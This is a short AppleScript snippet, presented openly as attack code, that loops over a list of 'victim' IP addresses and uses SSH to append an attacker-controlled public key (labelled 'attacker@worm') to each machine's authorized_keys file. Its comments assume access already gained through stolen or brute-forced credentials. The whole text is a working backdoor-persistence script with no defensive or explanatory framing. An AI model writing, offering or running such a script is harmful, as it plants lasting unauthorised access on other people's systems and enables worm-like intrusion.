-- Inserts a backdoor SSH public key into remote machines

set victimIPs to {"192.168.1.10", "192.168.1.11"}

repeat with ip in victimIPs
	-- Assume SSH key-based access or previously brute-forced creds
	do shell script "ssh user@" & ip & " 'echo \"ssh-rsa AAAAB3... attacker@worm\" >> ~/.ssh/authorized_keys'"
end repeat
